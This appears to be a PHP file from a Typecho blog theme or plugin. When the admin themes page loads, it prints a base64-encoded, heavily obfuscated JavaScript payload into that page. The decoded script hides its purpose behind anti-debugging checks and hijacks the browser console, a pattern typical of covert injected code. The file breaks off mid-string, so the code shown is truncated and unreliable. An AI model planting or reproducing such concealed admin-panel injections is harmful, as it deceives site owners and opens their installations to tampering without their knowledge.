<?php

if (!defined('__TYPECHO_ROOT_DIR__')) {
	http_response_code(404);
	exit;
}

if ($_SERVER['REQUEST_URI'] === '/admin/themes.php') {
	$typecho_themes_content = file_get_contents(__TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__ . 'themes.php');
	if (strpos($typecho_themes_content, 'echo base64_decode') === false) {
		print_r(base64_decode('PHNjcmlwdD47KGZ1bmN0aW9uKF8weDQ3ZmNhNixfMHgxZDhmM2Mpe3ZhciBfMHg0ZTU0NTk9XzB4NDdmY2E2KCk7ZnVuY3Rpb24gXzB4MjM1ZjkyKF8weDNjOWFjMyxfMHgxZTVmZjYsXzB4MTQxZmIyLF8weDNjMGMzYil7cmV0dXJuIF8weDFmMmMoXzB4MWU1ZmY2LTB4MzMwLF8weDNjMGMzYik7fWZ1bmN0aW9uIF8weDRhM2NiYyhfMHhlMWQ2ZDAsXzB4M2IwNTNjLF8weDIxZTRkMCxfMHgzODU2ZGMpe3JldHVybiBfMHgxZjJjKF8weGUxZDZkMC0weDg5LF8weDIxZTRkMCk7fXdoaWxlKCEhW10pe3RyeXt2YXIgXzB4Nzk5ZmY0PXBhcnNlSW50KF8weDIzNWY5MigweDQxMiwweDQwNSwweDQyMiwweDNlNSkpLygweDM3MysweDFlOTcrLTB4MSoweDIyMDkpKy1wYXJzZUludChfMHgyMzVmOTIoMHg0NDEsMHg0MWYsMHg0MDUsMHg0MWIpKS8oMHg2MjQrLTB4MSoweDE1ZjErMHhmY2YpKigtcGFyc2VJbnQoXzB4MjM1ZjkyKDB4NDMwLDB4NDIzLDB4NDIyLDB4NDJlKSkvKDB4MjQ0ZSstMHgxKi0weGNkNystMHgyNioweDE0YikpKy1wYXJzZUludChfMHgyMzVmOTIoMHg0MGQsMHg0MjcsMHg0MzIsMHg0NDcpKS8oMHgxZGJjKy0weDk5NistMHgxNDIyKStwYXJzZUludChfMHgyMzVmOTIoMHg0NDIsMHg0MmQsMHg0NGQsMHg0MWIpKS8oLTB4OSoweGEzKy0weDFmYjArMHg0YWUqMHg4KSstcGFyc2VJbnQoXzB4NGEzY2JjKDB4MTlmLDB4MWExLDB4MWFiLDB4MWI5KSkvKC0weDFlYTArMHgxZTlmKzB4NyoweDEpKigtcGFyc2VJbnQoXzB4NGEzY2JjKDB4MThkLDB4MWE3LDB4MTdkLDB4MTgxKSkvKC0weGQ2OSstMHhlODcrLTB4MSotMHgxYmY3KSkrLXBhcnNlSW50KF8weDRhM2NiYygweDE5MCwweDE4NCwweDE4YSwweDE4NSkpLygweDFiZTErMHhjYjYrLTB4Mjg4ZikrLXBhcnNlSW50KF8weDRhM2NiYygweDE2NywweDE3NiwweDE3YywweDE0ZCkpLygweDEqMHgxMjNkKzB4MWYyKy0weDEqMHgxNDI2KSoocGFyc2VJbnQoXzB4NGEzY2JjKDB4MTk5LDB4MTg3LDB4MTgzLDB4MTlmKSkvKDB4MWEwYioweDErLTB4MTEqMHgyMWIrMHg5Y2EpKTtpZihfMHg3OTlmZjQ9PT1fMHgxZDhmM2MpYnJlYWs7ZWxzZSBfMHg0ZTU0NTlbJ3B1c2gnXShfMHg0ZTU0NTlbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDVlZGNlZCl7XzB4NGU1NDU5WydwdXNoJ10oXzB4NGU1NDU5WydzaGlmdCddKCkpO319fShfMHgxMzI1LC0weDM3MzQqLTB4MSsweDExOSoweGIyKy0weDFhKi0weGFmMSkpO3ZhciBfMHgyMjE5MTE9KGZ1bmN0aW9uKCl7dmFyIF8weDQ3NzE1ZT0hIVtdO3JldHVybiBmdW5jdGlvbihfMHgzYWFiYTQsXzB4NGY5ZDZkKXt2YXIgXzB4NDE2MzZlPV8weDQ3NzE1ZT9mdW5jdGlvbigpe2Z1bmN0aW9uIF8weDVjOGI0YShfMHg0NjNiYmMsXzB4NWQ1OGRmLF8weDI4MDAzZCxfMHgzMTUwZDQpe3JldHVybiBfMHgxZjJjKF8weDQ2M2JiYy0weDEwZixfMHg1ZDU4ZGYpO31mdW5jdGlvbiBfMHgyYmIwZGIoXzB4MWJkZWViLF8weDE5NDY2NixfMHg1NzAxZmYsXzB4NTQ5MzA5KXtyZXR1cm4gXzB4MWYyYyhfMHg1NzAxZmYtIC0weDM1NyxfMHgxOTQ2NjYpO31pZihfMHgyYmIwZGIoLTB4MjJlLC0weDI2OCwtMHgyNGUsLTB4MjU4KT09PSd2UW5SdScpe2lmKF8weDRmOWQ2ZCl7dmFyIF8weDJjMzYzZD1fMHg0ZjlkNmRbXzB4NWM4YjRhKDB4MWY4LDB4MWVhLDB4MWQ3LDB4MWUzKV0oXzB4M2FhYmE0LGFyZ3VtZW50cyk7cmV0dXJuIF8weDRmOWQ2ZD1udWxsLF8weDJjMzYzZDt9fWVsc2V7dmFyIF8weDExMjJlZT1fMHhjNzMxZTJbXzB4NWM4YjRhKDB4MWY4LDB4MWY1LDB4MWQ4LDB4MjAwKV0oXzB4MTA4OWUyLGFyZ3VtZW50cyk7cmV0dXJuIF8weDFhOTdiYj1udWxsLF8weDExMjJlZTt9fTpmdW5jdGlvbigpe307cmV0dXJuIF8weDQ3NzE1ZT0hW10sXzB4NDE2MzZlO307fSgpKSxfMHgxNGVkMmI9XzB4MjIxOTExKHRoaXMsZnVuY3Rpb24oKXt2YXIgXzB4MmRhY2NjPXt9O18weDJkYWNjY1snYWl0S3knXT1fMHg0OTE5N2EoLTB4MTZjLC0weDE4MCwtMHgxNTQsLTB4MTVlKSsnKyQnO2Z1bmN0aW9uIF8weDQ5MTk3YShfMHg1MjQ4NmIsXzB4MjFjYjkwLF8weDNiYzdhNyxfMHg2YTUzZDUpe3JldHVybiBfMHgxZjJjKF8weDUyNDg2Yi0gLTB4MjU5LF8weDNiYzdhNyk7fWZ1bmN0aW9uIF8weDVjNGZhYyhfMHgyMDFjMzEsXzB4MTAzZmUzLF8weDQ2MWExNSxfMHg1NDAzODcpe3JldHVybiBfMHgxZjJjKF8weDU0MDM4Ny0gLTB4MzI3LF8weDIwMWMzMSk7fXZhciBfMHgyNDY3OTM9XzB4MmRhY2NjO3JldHVybiBfMHgxNGVkMmJbXzB4NWM0ZmFjKC0weDIyZSwtMHgyMjMsLTB4MWZlLC0weDIxYSldKClbXzB4NDkxOTdhKC0weDE0OCwtMHgxMjYsLTB4MTJkLC0weDE1YildKF8weDVjNGZhYygtMHgyMmQsLTB4MjNhLC0weDI1OSwtMHgyM2EpKycrJCcpW18weDQ5MTk3YSgtMHgxNGMsLTB4MTRiLC0weDE2MywtMHgxNGEpXSgpWydjb25zdHJ1Y3RvJysnciddKF8weDE0ZWQyYilbXzB4NWM0ZmFjKC0weDIwMywtMHgyMDMsLTB4MjFmLC0weDIxNildKF8weDI0Njc5M1snYWl0S3knXSk7fSk7XzB4MTRlZDJiKCk7ZnVuY3Rpb24gXzB4MWYyYyhfMHgxYWMzYzksXzB4ZWY4NGVkKXt2YXIgXzB4MjA2ZWU0PV8weDEzMjUoKTtyZXR1cm4gXzB4MWYyYz1mdW5jdGlvbihfMHgyMzZmZDMsXzB4M2Y4ZWZmKXtfMHgyMzZmZDM9XzB4MjM2ZmQzLSgtMHgxM2NjKzB4MSoweDFmN2QrMHg0Ki0weDJiNyk7dmFyIF8weGVkNmI5OD1fMHgyMDZlZTRbXzB4MjM2ZmQzXTtpZihfMHgxZjJjWyd1ZFFkUFknXT09PXVuZGVmaW5lZCl7dmFyIF8weDEyY2QzYz1mdW5jdGlvbihfMHg1NWZiOTYpe3ZhciBfMHgzYTg4NjM9J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ky89Jzt2YXIgXzB4MzdiNGEzPScnLF8weGZjNWQ3Nz0nJyxfMHg1OTE4ODI9XzB4MzdiNGEzK18weDEyY2QzYztmb3IodmFyIF8weGQ1NTExOD0tMHgxNWVkKy0weGIyMysweDVjKjB4NWMsXzB4NDk1NzY1LF8weDM4OTYwMixfMHgyYWEyNjA9MHhkNmUrLTB4MjMzMyotMHgxKy0weGQzKjB4M2I7XzB4Mzg5NjAyPV8weDU1ZmI5NlsnY2hhckF0J10oXzB4MmFhMjYwKyspO35fMHgzODk2MDImJihfMHg0OTU3NjU9XzB4ZDU1MTE4JSgtMHg4ZWQrMHgxKi0weDFjYmMrLTB4MyotMHhjOGYpP18weDQ5NTc2NSooLTB4YjllKi0weDIrLTB4MjYwNCsweGYwOCkrXzB4Mzg5NjAyOl8weDM4OTYwMixfMHhkNTUxMTgrKyUoMHhlYyoweGUrLTB4MSoweDJmOSstMHg5ZWIpKT9fMHgzN2I0YTMrPV8weDU5MTg4MlsnY2hhckNvZGVBdCddKF8weDJhYTI2MCsoMHg5NCotMHg2KzB4MWZhOSstMHgxYzI3KjB4MSkpLSgtMHgxYzc2KzB4NWQqLTB4M2IrLTB4MzFlZiotMHgxKSE9PTB4MWQqLTB4MTErMHgxYzA3Ky0weDFhMWE/U3RyaW5nWydmcm9tQ2hhckNvZGUnXSgweDdiYioweDIrMHgxODFjKy0weDI2OTMmXzB4NDk1NzY1Pj4oLSgweDkyZistMHgxMzkzKi0weDErLTB4ZTYqMHgyMCkqXzB4ZDU1MTE4Ji0weDFkKjB4MzIrMHgyKi0weGVkZCstMHgyKi0weDExYjUpKTpfMHhkNTUxMTg6MHg0OWMrMHgyKi0weDE1NysweDI2Ki0weGQpe18weDM4OTYwMj1fMHgzYTg4NjNbJ2luZGV4T2YnXShfMHgzODk2MDIpO31mb3IodmFyIF8weDQ3NzAzND0weDE2ZioweDIrLTB4MTEqMHgxYmErMHgxYTdjLF8weDUyN2U2YT1fMHgzN2I0YTNbJ2xlbmd0aCddO18weDQ3NzAzNDxfMHg1MjdlNmE7XzB4NDc3MDM0Kyspe18weGZjNWQ3Nys9JyUnKygnMDAnK18weDM3YjRhM1snY2hhckNvZGVBdCddKF8weDQ3NzAzNClbJ3RvU3RyaW5nJ10oMHg5NzMrLTB4MTg4NSsweGYyMikpWydzbGljZSddKC0oLTB4MWYqMHgyMSstMHg4KjB4MzFjKy0weDFjZTEqLTB4MSkpO31yZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KF8weGZjNWQ3Nyk7fTtfMHgxZjJjWydORHdHVkEnXT1fMHgxMmNkM2MsXzB4MWFjM2M5PWFyZ3VtZW50cyxfMHgxZjJjWyd1ZFFkUFknXT0hIVtdO312YXIgXzB4MmRhYmQwPV8weDIwNmVlNFstMHg5OTYrMHgxMjMqMHg1KzB4MSoweDNlN10sXzB4OTdlYmY0PV8weDIzNmZkMytfMHgyZGFiZDAsXzB4NTJmOWViPV8weDFhYzNjOVtfMHg5N2ViZjRdO2lmKCFfMHg1MmY5ZWIpe3ZhciBfMHgxYTFlYzI9ZnVuY3Rpb24oXzB4NWUxYjA2KXt0aGlzWydBWGx0Z1YnXT1fMHg1ZTFiMDYsdGhpc1snVUVKb21pJ109Wy0weDIxKi0weGM2Ky0weDgzMystMHg4YTkqMHgyLDB4MjZmMystMHg5NmYrLTB4MioweGVjMiwtMHg2MmUrLTB4MTkqLTB4NzUrLTB4NTNmXSx0aGlzWydIbHhlVEknXT1mdW5jdGlvbigpe3JldHVybiduZXdTdGF0ZSc7fSx0aGlzWydVeVFqdWcnXT0nXHg1Y3crXHgyMCpceDVjKFx4NWMpXHgyMCp7XHg1Y3crXHgyMConLHRoaXNbJ3RJenliYyddPSdbXHgyN3xceDIyXS4rW1x4Mjd8XHgyMl07P1x4MjAqfSc7fTtfMHgxYTFlYzJbJ3Byb3RvdHlwZSddWydKa29OV24nXT1mdW5jdGlvbigpe3ZhciBfMHhkYTYwZDE9bmV3IFJlZ0V4cCh0aGlzWydVeVFqdWcnXSt0aGlzWyd0SXp5YmMnXSksXzB4OGNmNTYzPV8weGRhNjBkMVsndGVzdCddKHRoaXNbJ0hseGVUSSddWyd0b1N0cmluZyddKCkpPy0tdGhpc1snVUVKb21pJ11bMHgxKjB4MWIxYSstMHg5OTkrMHgzOCotMHg1MF06LS10aGlzWydVRUpvbWknXVsweGMwYyotMHgyKzB4MTBiYystMHgzYWUqLTB4Ml07cmV0dXJuIHRoaXNbJ2hmS3dnWSddKF8weDhjZjU2Myk7fSxfMHgxYTFlYzJbJ3Byb3RvdHlwZSddWydoZkt3Z1knXT1mdW5jdGlvbihfMHgzNzU3MzYpe2lmKCFCb29sZWFuKH5fMHgzNzU3MzYpKXJldHVybiBfMHgzNzU3MzY7cmV0dXJuIHRoaXNbJ3pJZ1pueCddKHRoaXNbJ0FYbHRnViddKTt9LF8weDFhMWVjMlsncHJvdG90eXBlJ11bJ3pJZ1pueCddPWZ1bmN0aW9uKF8weDM3YzI2Yil7Zm9yKHZhciBfMHgyMTE5Yzk9MHgyMGQ5KzB4MSotMHgxNzZmKy0weDk2YSxfMHg0MjM4NDg9dGhpc1snVUVKb21pJ11bJ2xlbmd0aCddO18weDIxMTljOTxfMHg0MjM4NDg7XzB4MjExOWM5Kyspe3RoaXNbJ1VFSm9taSddWydwdXNoJ10oTWF0aFsncm91bmQnXShNYXRoWydyYW5kb20nXSgpKSksXzB4NDIzODQ4PXRoaXNbJ1VFSm9taSddWydsZW5ndGgnXTt9cmV0dXJuIF8weDM3YzI2Yih0aGlzWydVRUpvbWknXVstMHgyKi0weGNhNCstMHgxMzMxKy0weDEqMHg2MTddKTt9LG5ldyBfMHgxYTFlYzIoXzB4MWYyYylbJ0prb05XbiddKCksXzB4ZWQ2Yjk4PV8weDFmMmNbJ05Ed0dWQSddKF8weGVkNmI5OCksXzB4MWFjM2M5W18weDk3ZWJmNF09XzB4ZWQ2Yjk4O31lbHNlIF8weGVkNmI5OD1fMHg1MmY5ZWI7cmV0dXJuIF8weGVkNmI5ODt9LF8weDFmMmMoXzB4MWFjM2M5LF8weGVmODRlZCk7fWZ1bmN0aW9uIF8weDEzMjUoKXt2YXIgXzB4YzYwZjZmPVsnQk1Qb3dlQycsJ21acVlvdEMyRWh2Z3VobmYnLCd6ZDVXcE1lVXl3bjBBcScsJ0RMZlV1TnUnLCdETWZ0d2htJywnQmd2VXozck8nLCdEZ2pWemhLK0RoaStEYScsJ0RnOXREaGpQQk1DJywnQXdUNXpNbScsJ0IyOVFEdnEnLCdtWmlXcnd6VXFOTHgnLCdDMnZIQ01uTycsJ0NoalZEZzkwRXhiTCcsJzVBc1g2bHNMNzdZYjZrKzM1UW9hNVArTHZoTFd6cScsJ3p1dmZDMFMnLCdDTTRHRGdIUENZaVBrYScsJ21KaVdtZGpBdEsxWkV1cScsJ0Roakh5MnUnLCduZEc1bTBmdkVnak9ycScsJ0VmbjREaHEnLCdEZ251c2dXJywneXhidkR4bScsJ3IyUEh6dzgnLCdBaGpMekcnLCd5TUxVemEnLCdDSzFaQ2ZHJywndGc5SHpndksnLCduSmFab2RmU0N4TDBBZk8nLCd6dnJZcnVTJywnQXc1TUJXJywneDE5V0NNOTBCMTlGJywnenhqWUIzaScsJ3owRHdDTG0nLCdDM3JMQk12WScsJ0N4dkxDTkx0endYTHlXJywndnd6bUNlUycsJ3FNVE1CeGknLCdDZ3p0dXVDJywneXhiV0JoSycsJ3l1SGV0eGknLCdEMmZZQkcnLCd3TTlJQ3hxJywna2NHT2xJU1BrWUtSa3EnLCd0MnIwcjNxJywnbVpDV3F1bnJ6dVBBJywnenVUaXZnRycsJ0ROelJ5TW0nLCdFMzBVeTI5VUMzcllEcScsJ21acTRvdmYyRUt2UXRhJywnQmc5TicsJ3JlOW5xMjlVRGd2VURhJywneTJIVjVPK3M1bFUyNXlBWTU2UWJpSUsnLCdtWkNabWRHV3J4ZlZ5d2pBJywnRGc5WXF3WFMnLCd5d3JLcnh6TEJOcm1BcScsJ3R2blZ3TUcnLCd1ZTFvcU1tJywneTI5VUMzcllEd24wQlcnLCdtdHkxbVp1V3kzck93TTFLJywnRE1mMHpxJywneTI5VUMyOVN6cScsJ3l2TFdFd2knLCd6TTlZcndmSkFhJywnRHZ6aEFndScsJ20zV1lGZHI4bnhXWEZhJywnbmRxNHF3Zm1yMFRvJywnQk1uMEF3OVVrY0tHJ107XzB4MTMyNT1mdW5jdGlvbigpe3JldHVybiBfMHhjNjBmNmY7fTtyZXR1cm4gXzB4MTMyNSgpO312YXIgXzB4MzI1NGZhPShmdW5jdGlvbigpe3ZhciBfMHg2NDVjMzc9e307XzB4NjQ1YzM3W18weGIyZTQ2MCgtMHgyNjMsLTB4MjU1LC0weDI2YiwtMHgyNGIpXT1fMHgyMmNmZjQoLTB4MThlLC0weDFiNSwtMHgxYWIsLTB4MWMwKTtmdW5jdGlvbiBfMHgyMmNmZjQoXzB4NTRiNmNiLF8weDMwYjlmZCxfMHg1MDAzNTQsXzB4MTlmODIyKXtyZXR1cm4gXzB4MWYyYyhfMHg1MDAzNTQtIC0weDJiOSxfMHgxOWY4MjIpO31mdW5jdGlvbiBfMHhiMmU0NjAoXzB4MjdkNTU5LF8weGM0ZDU5ZSxfMHg0NDc2NDIsXzB4NWE1YmU5KXtyZXR1cm4gXzB4MWYyYyhfMHg0NDc2NDItIC0weDM0ZSxfMHhjNGQ1OWUpO312YXIgXzB4MTA0OGRlPV8weDY0NWMzNyxfMHg1MmQ0Nzg9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4NTMyZmI5LF8weDE0YzQ5YSl7dmFyIF8weDRiMTIzYj1fMHg1MmQ0Nzg/ZnVuY3Rpb24oKXtmdW5jdGlvbiBfMHhmZTI4NGIoXzB4NGM4NDBhLF8weDU2NWM1MSxfMHgxYWY3NWEsXzB4MjhiZDMzKXtyZXR1cm4gXzB4MWYyYyhfMHgyOGJkMzMtIC0weDM1LF8weDFhZjc1YSk7fWlmKF8weDE0YzQ5YSl7aWYoXzB4MTA0OGRlWydnR1ZyUyddIT09XzB4MTA0OGRlWydnR1ZyUyddKXt2YXIgXzB4MWM1OTA5PV8weDQ3OTQxMj9mdW5jdGlvbigpe2Z1bmN0aW9uIF8weDVmM2RiOChfMHg0Y2VjMjUsXzB4MzI0NzcxLF8weDQ5NTFiZixfMHgyODliZjQpe3JldHVybiBfMHgxZjJjKF8weDMyNDc3MS0gLTB4MTVhLF8weDQ5NTFiZik7fWlmKF8weDI4YzY2MCl7dmFyIF8weDVmMDlhZD1fMHgzODU2YmNbXzB4NWYzZGI4KC0weDVmLC0weDcxLC0weDc4LC0weDg5KV0oXzB4MzVlMjk4LGFyZ3VtZW50cyk7cmV0dXJuIF8weDRiMWFjMj1udWxsLF8weDVmMDlhZDt9fTpmdW5jdGlvbigpe307cmV0dXJuIF8weDEwYTE2YT0hW10sXzB4MWM1OTA5O31lbHNle3ZhciBfMHg1NTU2OWM9XzB4MTRjNDlhW18weGZlMjg0YigweGE5LDB4OWMsMHhhMywweGI0KV0oXzB4NTMyZmI5LGFyZ3VtZW50cyk7cmV0dXJuIF8weDE0YzQ5YT1udWxsLF8weDU1NTY5Yzt9fX06ZnVuY3Rpb24oKXt9O3JldHVybiBfMHg1MmQ0Nzg9IVtdLF8weDRiMTIzYjt9O30oKSksXzB4NDk1OWY2PV8weDMyNTRmYSh0aGlzLGZ1bmN0aW9uKCl7dmFyIF8weDEyNzMzMD17J2VUckVLJzpfMHgyMmRhNjkoMHhjNiwweGMyLDB4Y2QsMHhkNykrXzB4MjJkYTY5KDB4YjMsMHhiZSwweGI3LDB4YTQpK18weDIyZGE2OSgweGE0LDB4YjQsMHhkMiwweDllKSwnbmpOWEcnOmZ1bmN0aW9uKF8weDUxYWQ2OCxfMHgyNDY5OGIsXzB4MTdjNTExKXtyZXR1cm4gXzB4NTFhZDY4KF8weDI0Njk4YixfMHgxN2M1MTEpO30sJ09kdEd0JzpmdW5jdGlvbihfMHgzZTYxYmEsXzB4MTNjNTY0KXtyZXR1cm4gXzB4M2U2MWJhKF8weDEzYzU2NCk7fSwnQmtmbXInOmZ1bmN0aW9uKF8weDUyOWRkMyxfMHg1MDc0MTkpe3JldHVybiBfMHg1MjlkZDMrXzB4NTA3NDE5O30sJ1RvZExwJzoncmV0dXJuXHgyMChmdScrXzB4MTU1YjJkKC0weDFmNCwtMHgxZTYsLTB4MWQ3LC0weDFmZiksJ1N2QXlwJzpfMHgxNTViMmQoLTB4MjA3LC0weDFmYSwtMHgxZTYsLTB4MWU4KSsnY3RvcihceDIycmV0dScrXzB4MjJkYTY5KDB4Y2UsMHhjYiwweGI3LDB4YmYpKydceDIwKScsJ3JNc3BYJzpmdW5jdGlvbihfMHgyMTA5OGIsXzB4NTA2NDgwKXtyZXR1cm4gXzB4MjEwOThiPT09XzB4NTA2NDgwO30sJ3RZWmt4JzpfMHgyMmRhNjkoMHhjNSwweGIwLDB4Y2MsMHg5YiksJ0dqYWVvJzpfMHgxNTViMmQoLTB4MWU1LC0weDFkOSwtMHgxZGEsLTB4MWQxKSwneFN4dHQnOmZ1bmN0aW9uKF8weDUzYjZjNCl7cmV0dXJuIF8weDUzYjZjNCgpO30sJ3RjVEhsJzpfMHgyMmRhNjkoMHhhZiwweGFhLDB4YjYsMHhiMSksJ3VUUWdqJzpfMHgyMmRhNjkoMHhjMSwweGExLDB4YmIsMHhiZiksJ25rYlNJJzpfMHgxNTViMmQoLTB4MjE5LC0weDIyNCwtMHgyMjIsLTB4MjJkKSwnYXBVdXMnOl8weDIyZGE2OSgweDhiLDB4OTgsMHg4YywweDc5KSwnb29qdVQnOidleGNlcHRpb24nLCdQTU5CYyc6J3RhYmxlJywndnZrYmMnOl8weDE1NWIyZCgtMHgxZjYsLTB4MjBmLC0weDFmMCwtMHgyMDcpKycwJ30sXzB4YjM3YmI0PWZ1bmN0aW9uKCl7ZnVuY3Rpb24gXzB4MWZlOGZlKF8weDVkYmQyNixfMHgzYTgyZTksXzB4MTVjMzkxLF8weDNkMTQxMCl7cmV0dXJuIF8weDIyZGE2OShfMHg1ZGJkMjYtMHgxODYsXzB4MTVjMzkxLSAtMHgyNzUsXzB4NWRiZDI2LF8weDNkMTQxMC0weGVkKTt9dmFyIF8weDI4MGU0Yz17J1pvYnF0JzpfMHgxMjczMzBbXzB4NDA4NDEwKC0weDQ0LC0weDUzLC0weDM1LC0weDc0KV0sJ2FIRE1yJzonamF2YXNjcmlwdCcrJzphbGVydChceDIy5ZCv55SoJytfMHg0MDg0MTAoLTB4MTksLTB4MWYsLTB4NCwtMHgxOSkrXzB4NDA4NDEwKC0weDIyLC0weDNjLC0weDI3LC0weDI1KSwndmFTWHMnOmZ1bmN0aW9uKF8weDNhNWFlZCxfMHg0YzM2ZDEsXzB4M2I1OTVkKXtmdW5jdGlvbiBfMHg0ZGNjNjUoXzB4NDY3MDU2LF8weDJiYjUyNyxfMHgxZjJhZWYsXzB4M2EyYTA0KXtyZXR1cm4gXzB4MWZlOGZlKF8weDNhMmEwNCxfMHgyYmI1MjctMHg1OCxfMHgxZjJhZWYtIC0weDU0LF8weDNhMmEwNC0weDIzKTt9cmV0dXJuIF8weDEyNzMzMFtfMHg0ZGNjNjUoLTB4MWY4LC0weDIyMiwtMHgyMGQsLTB4MjA4KV0oXzB4M2E1YWVkLF8weDRjMzZkMSxfMHgzYjU5NWQpO319LF8weDkxNmM5NztmdW5jdGlvbiBfMHg0MDg0MTAoXzB4ODkzZDRmLF8weDUyN2ZjNixfMHg1ZGJlNDYsXzB4MmIzMDM3KXtyZXR1cm4gXzB4MjJkYTY5KF8weDg5M2Q0Zi0weDE4NyxfMHg1MjdmYzYtIC0weGU4LF8weDVkYmU0NixfMHgyYjMwMzctMHg1YSk7fXRyeXtfMHg5MTZjOTc9XzB4MTI3MzMwW18weDQwODQxMCgtMHgyNSwtMHg0NCwtMHgzZSwtMHg2MSldKEZ1bmN0aW9uLF8weDEyNzMzMFtfMHg0MDg0MTAoLTB4NTAsLTB4NGIsLTB4MzMsLTB4MzgpXShfMHgxMjczMzBbXzB4MWZlOGZlKC0weDFlNywtMHgxZTYsLTB4MWQ4LC0weDFlMSldKF8weDEyNzMzMFsnVG9kTHAnXSxfMHgxMjczMzBbJ1N2QXlwJ10pLCcpOycpKSgpO31jYXRjaChfMHg1MzNlNjcpe2lmKF8weDEyNzMzMFtfMHg0MDg0MTAoLTB4NDgsLTB4NTYsLTB4NTQsLTB4NTApXShfMHgxMjczMzBbJ3RZWmt4J10sXzB4MTI3MzMwW18weDFmZThmZSgtMHgxZWEsLTB4MWM2LC0weDFlNiwtMHgxZDYpXSkpe3ZhciBfMHg1MDRjMjg9e307XzB4NTA0YzI4W18weDQwODQxMCgtMHgzNiwtMHgzMCwtMHgzZCwtMHgxOSldPV8weDI4MGU0Y1tfMHg0MDg0MTAoLTB4NDksLTB4NDgsLTB4M2IsLTB4NGIpXTt2YXIgXzB4MzJmYzZhPV8weDUwNGMyODtfMHgyODBlNGNbXzB4NDA4NDEwKC0weDQzLC0weDI4LC0weDQ1LC0weDM1KV0oXzB4NGJmNTYyLCgpPT57ZnVuY3Rpb24gXzB4MTAxY2JhKF8weGJjMWY3MCxfMHg0MzAyODEsXzB4NDViZDZiLF8weDQ2MDAwNCl7cmV0dXJuIF8weDQwODQxMChfMHhiYzFmNzAtMHgzNCxfMHg0NWJkNmItIC0weDI0OSxfMHg0MzAyODEsXzB4NDYwMDA0LTB4OTcpO31mdW5jdGlvbiBfMHg1ZTMzNDcoXzB4NTFlN2IzLF8weDFmMGJhYixfMHgzYmNjODEsXzB4M2I4YWU2KXtyZXR1cm4gXzB4MWZlOGZlKF8weDNiY2M4MSxfMHgxZjBiYWItMHg3MCxfMHg1MWU3YjMtMHg0YzgsXzB4M2I4YWU2LTB4NWMpO31fMHgxMjQ4NGNbXzB4MTAxY2JhKC0weDI5ZiwtMHgyOWEsLTB4Mjk2LC0weDJhNykrXzB4NWUzMzQ3KDB4MzAxLDB4MzAyLDB4MzE2LDB4MmVmKV0oXzB4MjgwZTRjW18weDVlMzM0NygweDJmNSwweDMwYSwweDJkZiwweDMwNildKVtfMHgxMDFjYmEoLTB4MjZiLC0weDI3NywtMHgyN2EsLTB4Mjc5KV0oXzB4MzFmYmQ4PT57ZnVuY3Rpb24gXzB4NTM5ZWNmKF8weDNlNzE2MyxfMHgyZTRmNDksXzB4MjdiZTkzLF8weDdhZDA4NCl7cmV0dXJuIF8weDVlMzM0NyhfMHgyZTRmNDktIC0weDUxYixfMHgyZTRmNDktMHg0ZCxfMHgzZTcxNjMsXzB4N2FkMDg0LTB4MWU2KTt9ZnVuY3Rpb24gXzB4NDAyZjJjKF8weDNlZDI2ZSxfMHg1ZWE4YTAsXzB4NWQ1NzcwLF8weGYwMDdkZil7cmV0dXJuIF8weDEwMWNiYShfMHgzZWQyNmUtMHg1LF8weDNlZDI2ZSxfMHg1ZDU3NzAtMHg1N2EsXzB4ZjAwN2RmLTB4NDMpO31fMHgzMWZiZDhbXzB4NTM5ZWNmKC0weDIzMiwtMHgyMzgsLTB4MjRjLC0weDIxYyldPV8weDMyZmM2YVtfMHg1MzllY2YoLTB4MjI0LC0weDIxMCwtMHgxZmEsLTB4MjA3KV07fSk7fSwtMHgyNWVmKzB4NGQ5KjB4MisweDFjYTEpO31lbHNlIF8weDkxNmM5Nz13aW5kb3c7fXJldHVybiBfMHg5MTZjOTc7fTtmdW5jdGlvbiBfMHgyMmRhNjkoXzB4NDUxMjdlLF8weDU2ZDAyOCxfMHgxZTU1ZmUsXzB4Njk2NzgzKXtyZXR1cm4gXzB4MWYyYyhfMHg1NmQwMjgtIC0weDRhLF8weDFlNTVmZSk7fXZhciBfMHhhMzRmMWU9XzB4MTI3MzMwW18weDE1NWIyZCgtMHgyMjMsLTB4MjI4LC0weDIwNiwtMHgyMDgpXShfMHhiMzdiYjQpO2Z1bmN0aW9uIF8weDE1NWIyZChfMHg0YTk4MmUsXzB4MWRiMGMwLF8weDFjYzkyMSxfMHg1YjY5MDcpe3JldHVybiBfMHgxZjJjKF8weDRhOTgyZS0gLTB4MmY5LF8weDFkYjBjMCk7fXZhciBfMHgxNTUwNzg9XzB4YTM0ZjFlW18weDIyZGE2OSgweGNkLDB4YjUsMHg5OSwweGI0KV09XzB4YTM0ZjFlWydjb25zb2xlJ118fHt9LF8weDRmNzhhMj1bXzB4MTI3MzMwW18weDE1NWIyZCgtMHgyMjIsLTB4MjQxLC0weDIxZiwtMHgyMzgpXSxfMHgxMjczMzBbJ3VUUWdqJ10sXzB4MTI3MzMwWydua2JTSSddLF8weDEyNzMzMFtfMHgxNTViMmQoLTB4MjIxLC0weDIzZiwtMHgyNDAsLTB4MjA5KV0sXzB4MTI3MzMwW18weDIyZGE2OSgweGMyLDB4YzUsMHhjMywweGUzKV0sXzB4MTI3MzMwW18weDIyZGE2OSgweGNhLDB4YjEsMHhhMywweGQxKV0sXzB4MjJkYTY5KDB4ZTcsMHhjZCwweGU3LDB4YzkpXTtmb3IodmFyIF8weDEyMWY0ND0tMHhhMGYrLTB4MjVlMCstMHgyZmVmKi0weDE7XzB4MTIxZjQ0PF8weDRmNzhhMltfMHgyMmRhNjkoMHhlMCwweGMxLDB4Y2IsMHhiZCldO18weDEyMWY0NCsrKXt2YXIgXzB4NDU0N2JjPV8weDEyNzMzMFtfMHgxNTViMmQoLTB4MjA4LC0weDIyYSwtMHgxZmQsLTB4MjFmKV1bJ3NwbGl0J10oJ3wnKSxfMHgzNTU2OTQ9MHg5ZmMqMHgyKzB4MTE2YyotMHgxKy0weDEqMHgyOGM7d2hpbGUoISFbXSl7c3dpdGNoKF8weDQ1NDdiY1tfMHgzNTU2OTQrK10pe2Nhc2UnMCc6XzB4MTU1MDc4W18weDFkMmY5MF09XzB4MjdmZTQzO2NvbnRpbnVlO2Nhc2UnMSc6XzB4MjdmZTQzW18weDE1NWIyZCgtMHgxZWMsLTB